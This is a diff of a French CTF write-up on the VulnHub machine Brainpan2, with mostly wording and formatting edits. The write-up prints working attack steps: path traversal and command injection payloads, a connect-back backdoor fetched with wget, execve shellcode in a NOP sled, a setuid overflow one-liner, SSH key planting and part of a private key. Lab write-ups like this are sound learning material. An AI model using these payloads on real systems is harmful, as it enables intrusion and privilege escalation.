@@ -9,7 +9,7 @@ Introduction
 
 Un CTF, c'est comme une boîte de chocolats : on ne sait jamais sur quoi on va tomber.  
 
-Avec ce challenge [Brainpan2](http://vulnhub.com/entry/brainpan_2,56/) trouvé sur *VulnHub* ce fût le cas car le niveau était bien plus élevé et rien ne pouvais le laisser présager car aucune indication particulière ne nous était laissé.  
+Avec ce challenge [Brainpan2](http://vulnhub.com/entry/brainpan_2,56/) trouvé sur *VulnHub* ce fût le cas, car le niveau était bien plus élevé et rien ne pouvait le laisser présager, car aucune indication particulière ne nous était laissé.  
 
 Mais en suivant le principe habituel d'augmenter ses privilèges jusqu'à l'obtention du root je suis finalement parvenu à la fin de ce CTF intéressant.  
 
@@ -84,19 +84,19 @@ Tout de suite on remarque deux ports non standard dont l'un est occupé par un *
 
 Si on se connecte depuis le navigateur on tombe sur une image tirée d'un article en relation avec le hacking. Dans la source est mentionnée en commentaire l'origine de l'article.  
 
-Dans le doute je récupère l'image originale sur l'article cité et je la diff avec l'image du challenge : idem, rien à signaler.  
+Dans le doute, je récupère l'image originale sur l'article cité et je la diff avec l'image du challenge : idem, rien à signaler.  
 
-Je part ensuite à la recherche aux vulnérabilités pour ce petit serveur. Une recherche sur *bugs.python.org* retourne quelques résultats mais pour la plupart assez anciens, or le Python installé est à jour.  
+Je pars ensuite à la recherche aux vulnérabilités pour ce petit serveur. Une recherche sur *bugs.python.org* retourne quelques résultats, mais pour la plupart assez anciens, or le Python installé est à jour.  
 
 Quelques tentatives de remonter l'arborescence n'ont rien donné.  
 
-Je décide en dernier recours de lancer [DirBuster](https://sourceforge.net/projects/dirbuster/) pour tenter de découvrir des dossiers et fichiers non indexés sur le serveur. Le logiciel trouve rapidement un dossier /bin qui contient un fichier brainpan.exe.  
+Je décide en dernier recours de lancer [DirBuster](https://sourceforge.net/projects/dirbuster/) pour tenter de découvrir des dossiers et fichiers non indexés sur le serveur. Le logiciel trouve rapidement un dossier `/bin` qui contient un fichier `brainpan.exe`.  
 
-Mais quand on l'analyse il ne s'agit que d'une image JPEG. Un coup de *hexdump* confirme qu'il n'y a pas d'exécutable PE à l'intérieur.  
+Mais quand on l'analyse, il ne s'agit que d'une image JPEG. Un coup de `hexdump` confirme qu'il n'y a pas d'exécutable PE à l'intérieur.  
 
 ![Image Mario Bros](/assets/img/brainpan.jpg)
 
-Du coup je me retranche sur le port 9999 auquel je me connecte via *ncat*. On a affaire à un serveur de commandes fait maison qui comporte une poignée de commandes dont certaines ne sont pas implémentées (USERS, MSG) ou non-accessibles avec nos privilèges (SYSTEM).
+Du coup je me retranche sur le port 9999 auquel je me connecte via `ncat`. On a affaire à un serveur de commandes fait maison qui comporte une poignée de commandes dont certaines ne sont pas implémentées (`USERS`, `MSG`) ou non-accessibles avec nos privilèges (`SYSTEM`).
 
 ```
 _|                            _|                                        
@@ -123,7 +123,7 @@ _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
     USERS    MSG     SYSTEM     BYE
 ```
 
-La commande FILES retourne une liste de fichier générée de toute évidence via un ls -l
+La commande `FILES` retourne une liste de fichier générée de toute évidence via un `ls -l`
 
 ```
 total 40
@@ -134,20 +134,20 @@ total 40
 -rwxrwxrwx 1 anansi anansi    19 Nov  9 09:16 test-2
 ```
 
-Malheureusement cette commande ne prend aucun argument, on le peut donc pas remonter l'arborescence.  
+Malheureusement cette commande ne prend aucun argument, on ne peut donc pas remonter l'arborescence.  
 
-La commande HELP affiche le contenu d'une page de manuel et la commande CREATE permet de créer un fichier (on saisie d'abord le nom du fichier puis ensuite le contenu sur une ligne).  
+La commande `HELP` affiche le contenu d'une page de manuel et la commande `CREATE` permet de créer un fichier (on saisit d'abord le nom du fichier puis ensuite le contenu sur une ligne).  
 
-Le résultat produit un fichier avec les droits de l'utilisateur *anansi*, on sait donc qui fait tourner le serveur sur lequel on est connecté.  
+Le résultat produit un fichier avec les droits de l'utilisateur `anansi`, on sait donc qui fait tourner le serveur sur lequel on est connecté.  
 
 Un pied dans la porte
 ---------------------
 
-La commande VIEW fonctionne sur le même principe : pas de passage d'argument direct mais une invite pour saisir le nom du fichier.  
+La commande `VIEW` fonctionne sur le même principe : pas de passage d'argument direct, mais une invite pour saisir le nom du fichier.  
 
-On s’aperçoit vite de deux choses : il est possible de remonter l'arborescence en spécifiant par exemple ../../../../../../etc/passwd et il est possible d'exécuter des commandes en passant par exemple ;ls.  
+On s’aperçoit vite de deux choses : il est possible de remonter l'arborescence en spécifiant par exemple `../../../../../../etc/passwd` et il est possible d'exécuter des commandes en passant par exemple `;ls`.  
 
-La commande sous-jacente est un simple *cat*. Il est donc préférable de lui passer un argument avant le point virgule sinon les process zombies risquent de s'entasser sur la machine virtuelle (car *cat* va attendre des données sur l'entrée standard).  
+La commande sous-jacente est un simple `cat`. Il est donc préférable de lui passer un argument avant le point virgule sinon les process zombies risquent de s'entasser sur la machine virtuelle (car `cat` va attendre des données sur l'entrée standard).  
 
 On passera plutôt nos commandes de cette façon :
 
@@ -162,15 +162,15 @@ Release:        7.2
 Codename:       wheezy
 ```
 
-Il aurait pu être intéressant de tenter de récupérer le binaire en appelant VIEW sur *brainpan.exe* mais le serveur n’envoie qu'une partie de l'exécutable s'arrêtant sans doute sur un octet nul.  
+Il aurait pu être intéressant de tenter de récupérer le binaire en appelant `VIEW` sur `brainpan.exe` mais le serveur n’envoie qu'une partie de l'exécutable s'arrêtant sans doute sur un octet nul.  
 
-Grace à notre accès particulier on parvient à déterminer que le programme se trouve dans */opt/brainpan* qui est un dossier appartement à root mais avec le sticky bit (donc tout le monde peut écrire dedans comme dans /tmp).  
+Grâce à notre accès particulier, on parvient à déterminer que le programme se trouve dans `/opt/brainpan` qui est un dossier appartement à root mais avec le sticky bit (donc tout le monde peut écrire dedans comme dans `/tmp`).  
 
-On remarque aussi que *wget* est installé :) C'est le moment d'obtenir un accès plus confortable.  
+On remarque aussi que `wget` est installé :) C'est le moment d'obtenir un accès plus confortable.  
 
-Sur la machine hôte on lance le web-serveur Python (*python -m SimpleHTTPServer 8000*) puis on récupère une backdoor Perl connect-back en injectant une commande *wget* via VIEW sur la machine invitée.  
+Sur la machine hôte, on lance le web-serveur Python (`python -m SimpleHTTPServer 8000`) puis on récupère une backdoor Perl connect-back en injectant une commande `wget` via `VIEW` sur la machine invitée.  
 
-On ouvre un port via *ncat* sur la machine hôte puis on établie la connexion depuis la machine invitée.  
+On ouvre un port via `ncat` sur la machine hôte puis on établit la connexion depuis la machine invitée.  
 
 ```
                           >> VIEW
@@ -183,25 +183,25 @@ Data Cha0s Connect Back Backdoor
 [*] Datached
 ```
 
-L'utilisateur *anansi* n'a pas grand chose dans son dossier personnel : historique vide et pas de dossier .ssh.  
+L'utilisateur `anansi` n'a pas grand-chose dans son dossier personnel : historique vide et pas de dossier `.ssh`.  
 
-D'ailleurs SSH est configuré pour écouter sur l'interface loopback sur le port 2222, ce qui nous facilite pas la tache.  
+D'ailleurs SSH est configuré pour écouter sur l'interface loopback sur le port 2222, ce qui ne nous facilite pas la tache.  
 
 On va plutôt installer un remplaçant de SSH, seulement gcc n'est pas installé sur la machine :(  
 
 On va être obligés de compiler sur la machine hôte puis uploader sur la VM... sauf que je suis en 64bits alors que la Debian est une 32 bits. No problemo !  
 
-On récupère [tsh-0.6 (Tiny Shell)](http://packetstormsecurity.com/files/31650/tsh-0.6.tgz.html), on étudie le *Makefile* et à la section Linux on rajoute *-m32* pour le binaire serveur :
+On récupère [tsh-0.6 (Tiny Shell)](http://packetstormsecurity.com/files/31650/tsh-0.6.tgz.html), on étudie le `Makefile` et à la section Linux on rajoute `-m32` pour le binaire serveur :
 
 ```bash
 gcc -O -W -Wall -o tshd $(SERVER_OBJ) -lutil -DLINUX -m32
 ```
 
-Plus qu'à compiler (make linux) puis on upload/exec (./tshd). On peut maintenant se connecter sur notre nouveau shell de luxe :)  
+Plus qu'à compiler (make linux) puis on upload/exec (`./tshd`). On peut maintenant se connecter sur notre nouveau shell de luxe :)  
 
-tsh remplace très bien SSH car il offre un TTY et permet d'envoyer / récupérer des fichiers à la manière de scp.  
+`tsh` remplace très bien SSH car il offre un TTY et permet d'envoyer / récupérer des fichiers à la manière de `scp`.  
 
-Une fois connecté on s’aperçoit en listant /home que l'utilisateur *reynard* a laissé des permissions à ses données en lecture pour tous.
+Une fois connecté on s’aperçoit en listant `/home` que l'utilisateur `reynard` a laissé des permissions à ses données en lecture pour tous.
 
 ```
 /home/reynard:
@@ -221,9 +221,9 @@ drwxr-xr-x 3 reynard reynard 4096 Nov  4 19:32 web
 Highway to shell
 ----------------
 
-On relève principalement la présence d'un exécutable setuid root nommé *msg\_root*.  
+On relève principalement la présence d'un exécutable setuid root nommé `msg_root`.  
 
-Le contenu du fichier *readme.txt* dans le même dossier est le suivant :  
+Le contenu du fichier `readme.txt` dans le même dossier est le suivant :  
 
 ```
 msg_root is a quick way to send a message to the root user. 
@@ -239,13 +239,13 @@ Si on exécute le programme de cette façon :
 $ ./msg_root "plop" "ceci est mon message"
 ```
 
-On retrouve dans le fichier /tmp/msg.txt :  
+On retrouve dans le fichier `/tmp/msg.txt` :  
 
 ```
 plop: ceci est mon message
 ```
 
-L'ouverture du fichier semble se faire en mode append et on se dit que l'on a raté une occasion d'ajouter une ligne à */etc/passwd* en faisant préalablement un lien symbolique.  
+L'ouverture du fichier semble se faire en mode append et on se dit que l'on a raté une occasion d'ajouter une ligne à `/etc/passwd` en faisant préalablement un lien symbolique.  
 
 On récupère le fichier via le client tsh sur la machine hôte :  
 
@@ -288,9 +288,9 @@ On ouvre l'exécutable avec le désassembleur et débogueur [radare2](http://rad
 \          0x08048781    c3           ret
 ```
 
-Le programme vérifie d'abord le nombre d'argument puis affiche un message et quitte s'il n'a pas eu le bon nombre.  
+Le programme vérifie d'abord le nombre d'arguments puis affiche un message et quitte s'il n'a pas eu le bon nombre.  
 
-Si tout est ok, il repasse ces arguments à la fonction *get\_name* du programme (le programme n'est pas strippé, c'est pour cela que le nom de la fonction apparaît).  
+Si tout est ok, il repasse ces arguments à la fonction `get_name` du programme (le programme n'est pas strippé, c'est pour cela que le nom de la fonction apparaît).  
 
 Cette méthode commence par réserver 32 octets (0x20) pour les variables locales.  
 
@@ -359,19 +359,19 @@ Cette méthode commence par réserver 32 octets (0x20) pour les variables locale
 \          0x0804873a    c3           ret
 ```
 
-En faisant l'inventaire des adresses relatives à ebp en négatif on détermine que la fonction a 3 variables locales (respectivement ebp-4, -8 et -18 en décimal).  
+En faisant l'inventaire des adresses relatives à `ebp` en négatif, on détermine que la fonction a 3 variables locales (respectivement `ebp-4`, `-8` et `-18` en décimal).  
 
-A l'instruction 0x080486a7, l'adresse de la fonction *msg\_root* est copiée dans ebp-4.  
+À l'instruction `0x080486a7`, l'adresse de la fonction `msg_root` est copiée dans `ebp-4`.  
 
-En ebp-0x12 (= ebp-18), c'est l'adresse d'un buffer qui est passé. Ce buffer est plus tard utilisé comme destination soit pour strcpy soit pour strncpy.  
+En `ebp-0x12` (= `ebp-18`), c'est l'adresse d'un buffer qui est passé. Ce buffer est plus tard utilisé comme destination soit pour `strcpy` soit pour `strncpy`.  
 
-Enfin à ebp-8 on trouvera une adresse mémoire pointant vers une zone allouée sur le tas par malloc().  
+Enfin à `ebp-8` on trouvera une adresse mémoire pointant vers une zone allouée sur le tas par `malloc()`.  
 
-Notez que le buffer utilisé pour str(n)cpy semble bizarrement aligné car 18 n'est pas un multiple de 4 (32 bits).  
+Notez que le buffer utilisé pour `str(n)cpy` semble bizarrement aligné, car 18 n'est pas un multiple de 4 (32 bits).  
 
 Je ne saurais pas dire si c'est la volonté du compilateur ou le résultat d'une modification du binaire pour le challenge.  
 
-Du coup on a une stack que l'on pourrait représenter de cette façon :  
+Du coup, on a une stack que l'on pourrait représenter de cette façon :  
 
 ```
 adresses hautes
@@ -390,23 +390,23 @@ adresses hautes
 adresses basses
 ```
 
-Dans tous les cas, cette fonction *get\_name* commence par tester la longueur du nom d'utilisateur.  
+Dans tous les cas, cette fonction `get_name`* commence par tester la longueur du nom d'utilisateur.  
 
-Si cette longueur est inférieure ou égale à 17, le nom d'utilisateur est copié vers ebp-18 à l'aide de strcpy.  
+Si cette longueur est inférieure ou égale à 17, le nom d'utilisateur est copié vers `ebp-18` à l'aide de `strcpy`.  
 
-Si la longueur est supérieure à 17, la copie est réalisée avec strncpy en spécifiant une taille de 18 octets.  
+Si la longueur est supérieure à 17, la copie est réalisée avec `strncpy` en spécifiant une taille de 18 octets.  
 
-Déjà on remarque un problème car de ebp-18 à ebp-8 il n'y a que 10 octets (le calcul est pas difficile :p )  
+Déjà on remarque un problème, car de `ebp-18` à `ebp-8` il n'y a que 10 octets (le calcul est pas difficile :p )  
 
 Donc si l'on passe un nom d'utilisateur de plus de 10 caractères on écrase déjà ce qui suit.  
 
-En revanche comme on ne peut écraser que maximum 18 octets via l'appel à strncpy, on ne peut pas écraser ni le saved-ebp ni le saved-eip.  
+En revanche comme on ne peut écraser que maximum 18 octets via l'appel à `strncpy`, on ne peut pas écraser ni le saved-ebp ni le saved-eip.  
 
-L'objectif sera donc d'écraser l'adresse de *save\_msg* qui est stocké à ebp-4.  
+L'objectif sera donc d'écraser l'adresse de `save_msg` qui est stocké à `ebp-4`.  
 
-Si on passe un nom d'utilisateur de 17 caractères, le programme invoque strcpy et écrase 3 octets à ebp-4, le 4ème étant l'octet nul ajouté par strcpy.  
+Si on passe un nom d'utilisateur de 17 caractères, le programme invoque `strcpy` et écrase 3 octets à `ebp-4`, le 4ème étant l'octet nul ajouté par `strcpy`.  
 
-En revanche si on passe 18 caractères (ou plus), on écrase entièrement la pointeur vers *save\_msg* car comme indiqué dans la manpage de strncpy :  
+En revanche si on passe 18 caractères (ou plus), on écrase entièrement le pointeur vers `save_msg` car comme indiqué dans la manpage de `strncpy` :  
 
 > The stpncpy() and strncpy() functions copy at most n characters from src into dst. If src is less than n characters long, the remainder of dst is filled with '\0' characters. Otherwise, dst is not terminated.
 
@@ -442,13 +442,13 @@ int main(int argc, char *argv[])
 }
 ```
 
-Ici on a deux buffers sur la pile : buff sur lequel va être recopié des caractères via strncpy et s qui est initialisé à "XXX".  
+Ici on a deux buffers sur la pile : `buff` sur lequel va être recopié des caractères via `strncpy` et `s` qui est initialisé à "XXX".  
 
-En plus de la chaîne à copier dans buff, le programme prend aussi le nombre d'octets à copier (count).  
+En plus de la chaîne à copier dans `buff`, le programme prend aussi le nombre d'octets à copier (`count`).  
 
-Du moment que count est supérieur à taille du buffer passé et inférieur à 9 tout va bien :  
+Du moment que `count` est supérieur à taille du buffer passé et inférieur à 9 tout va bien :  
 
-```bash
+```console
 $ ./test 2 A
 Copie de 2 octets.
 Copy: A.
@@ -460,27 +460,27 @@ Copy: AAAA.
 s = XXX.
 ```
 
-Si count est égal à la taille du buffer passé alors le zéro terminal n'est pas placé :  
+Si `count` est égal à la taille du buffer passé alors le zéro terminal n'est pas placé :  
 
-```bash
+```console
 $ ./test 4 AAAA
 Copie de 4 octets.
 Copy: AAAAVVVVXXX.
 s = XXX.
 ```
 
-sans pour autant qu'on écrase tout le reste (strncpy s'arrête tout de même sinon aucun intérêt) :  
+Sans pour autant qu'on écrase tout le reste (`strncpy` s'arrête tout de même sinon aucun intérêt) :  
 
-```bash
+```console
 $ ./test 4 AAAAAA
 Copie de 4 octets.
 Copy: AAAAVVVVXXX.
 s = XXX.
 ```
 
-A partir de 12 on a un comportement original car on écrase s et comme la chaîne n'est pas terminée elle lit des caractères dans count (et éventuellement du padding).  
+À partir de 12 on a un comportement original, car on écrase `s` et comme la chaîne n'est pas terminée elle lit des caractères dans `count` (et éventuellement du padding).  
 
-```bash
+```console
 $ ./test 12 AAAAAAAAAAAA
 Copie de 12 octets.
 Copy: AAAAAAAAAAAA
@@ -494,7 +494,7 @@ G0tr00t ?
 
 Revenons à nos moutons en appliquant tout ça au programme qui nous intéresse. D'abord on teste avec un utilisateur de 17 caractères :  
 
-```bash
+```console
 sh-4.2$ gdb -q ./msg_root 
 Reading symbols from msg_root...done.
 (gdb) r `python -c "print 'A'*17"` test
@@ -504,7 +504,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x00414141 in ?? ()
 ```
 
-On a bien écrasé *saved\_msg* (mais seulement en partie car strcpy a ajouté un octet nul) et le programme a tenté de sauter à cette adresse.  
+On a bien écrasé `saved_msg` (mais seulement en partie, car `strcpy` a ajouté un octet nul) et le programme a tenté de sauter à cette adresse.  
 
 Maintenant testons avec 18 caractères (ou plus).  
 
@@ -522,12 +522,12 @@ Ici la difficulté est liée au fait qu'on a un buffer très petit pour placer l
 
 Heureusement pour nous, l'[ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) n'est pas activée :  
 
-```bash
+```console
 anansi@brainpan2:~$ cat /proc/sys/kernel/randomize_va_space
 0
 ```
 
-On va donc pouvoir faire une exploitation "old-school" qui consiste à charger le shellcode en environnement, auquel cas on aura toute la place souhaitée pour le shellcode avec un nop-sled énorme :)  
+On va donc pouvoir faire une exploitation "old-school" qui consiste à charger le shellcode en environnement, auquel cas, on aura toute la place souhaitée pour le shellcode avec un nop-sled énorme :)  
 
 On écrit un petit programme qui nous donnera l'adresse du shellcode une fois monté dans l'environnement :  
 
@@ -547,7 +547,7 @@ On compile, on upload, on rend exécutable...
 
 On trouve [un shellcode sympa](http://www.shell-storm.org/shellcode/files/shellcode-399.php) qu'on exporte avec un nop-slep de 64000 octets (c'est une piscine olympique de nops !)  
 
-```bash
+```console
 anansi@brainpan2:~$ export EGG=`perl -e 'print "\x90"x64000 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'`
 anansi@brainpan2:~$ /tmp/get_addr 
 EGG => 0xbfff0007
@@ -555,7 +555,7 @@ EGG => 0xbfff0007
 
 Comble de la malchance, un octet nul est présent dans l'adresse... Mais vu la taille du nop-sled on peut mettre 256 de plus, on est toujours dedans :  
 
-```
+```console
 anansi@brainpan2:~$ /home/reynard/msg_root `perl -e 'print "A"x14 . "\x07\x01\xff\xbf"'` test
 $ id
 uid=104(root) gid=1000(anansi) groups=106(root),50(staff),1000(anansi)
@@ -563,9 +563,9 @@ uid=104(root) gid=1000(anansi) groups=106(root),50(staff),1000(anansi)
 
 Bingo !  
 
-Un petit tour de manip plus tard afin de relancer *tshd* mais avec nos nouveaux privilèges...  
+Un petit tour de manip plus tard afin de relancer `tshd` mais avec nos nouveaux privilèges...  
 
-```bash
+```console
 root # cd /root/
 root # ls -al
 total 28
@@ -581,7 +581,7 @@ drwx------  2 root  root  4096 Nov  4 10:08 .aptitude
 
 Le flag est là ! Sauf que...
 
-```bash
+```console
 root # cat flag.txt 
 cat: flag.txt: Permission denied
 root # cat whatif.txt 
@@ -621,11 +621,11 @@ Change: 2013-11-05 09:47:34.316281925 -0500
 
 On nous a fait un mauvais tour : il y a deux utilisateurs root.  
 
-L'un est le vrai (uid 0) et a un espace en fin de username, l'autre est en fait un utilisateur lambda (uid 104) mais avec le username root classique.  
+L'un est le vrai (uid 0) et a un espace en fin de username, l'autre est en fait un utilisateur lambda (uid 104) mais avec le username `root` classique.  
 
-Avec une recherche de fichiers on trouve dans */opt/old* un dossier *'brainpan-1.8'* appartenant au faux root :  
+Avec une recherche de fichiers, on trouve dans `/opt/old` un dossier `brainpan-1.8` appartenant au faux root :  
 
-```bash
+```console
 root # ls -l /opt/old/brainpan-1.8/
 total 28
 -rwsr-xr-x 1 puck puck  17734 Nov  4 14:37 brainpan-1.8.exe
@@ -636,19 +636,19 @@ total 28
 Same old story
 --------------
 
-On remarque un exécutable setuid pour l'utilisateur *puck*.  
+On remarque un exécutable setuid pour l'utilisateur `puck`.  
 
-```bash
+```console
 root # cat /opt/old/brainpan-1.8/brainpan.cfg
 port=9333
 ipaddr=127.0.0.1
 ```
 
-Il faut éditer le fichier de configuration du *brainpan* pour changer l'interface en 0.0.0.0. Il faut aussi être dans le même dossier que le binaire pour le lancer sinon on obtient une erreur *fopen*.  
+Il faut éditer le fichier de configuration du `brainpan` pour changer l'interface en 0.0.0.0. Il faut aussi être dans le même dossier que le binaire pour le lancer sinon on obtient une erreur `fopen`.  
 
-En se connectant on remarque qu'il s'agit d'une version avec moins de fonctionnalités mais la faille de VIEW est aussi présente.  
+En se connectant on remarque qu'il s'agit d'une version avec moins de fonctionnalités, mais la faille de `VIEW` est aussi présente.  
 
-Par conséquent on récupère la clé privée SSH de *puck* :  
+Par conséquent, on récupère la clé privée SSH de `puck` :  
 
 ```
 -----BEGIN RSA PRIVATE KEY-----
@@ -685,7 +685,7 @@ h70jSTd7a/abnWbbJQEq47JIvuL4ScdQezE+r3LvpYFVaYBjsUWmf7kskMs1jyj3
 
 Malheureusement la clé privée est protégée par une passphrase, impossible de l'utiliser.  
 
-Solution : on envoie nos clés publiques / privées sur le serveur puis on exploite VIEW pour ajouter la clé publique dans les clés autorisées de *puck* :
+Solution : on envoie nos clés publiques / privées sur le serveur puis on exploite `VIEW` pour ajouter la clé publique dans les clés autorisées de `puck` :
 
 ```
                           >> VIEW
@@ -694,7 +694,7 @@ Solution : on envoie nos clés publiques / privées sur le serveur puis on explo
 
 On se connecte au serveur SSH local (notez que l'adresse sur laquelle écoute le serveur SSH est une autre blague) :  
 
-```bash
+```console
 root # ssh puck@127.0.1.1 -p 2222 -i /tmp/id_rsa 
 Enter passphrase for key '/tmp/id_rsa': 
 Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
@@ -706,7 +706,7 @@ uid=1001(puck) gid=1001(puck) groups=1001(puck),50(staff)
 That's all folks !
 ------------------
 
-C'est bien on a maintenant les droits de *puck*... So what ? Il a un dossier caché *.backup* :  
+C'est bien on a maintenant les droits de `puck`... So what ? Il a un dossier caché `.backup` :  
 
 ```
 ./.backup:
@@ -738,7 +738,7 @@ mv .ssh .bash* .backup
 
 Utilisons donc cette fameuse clé de backup :  
 
-```bash
+```console
 puck@brainpan2:~$ ssh -l "root " 127.0.1.1 -p 2222 -i .backup/.ssh/id_rsa
 Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
 
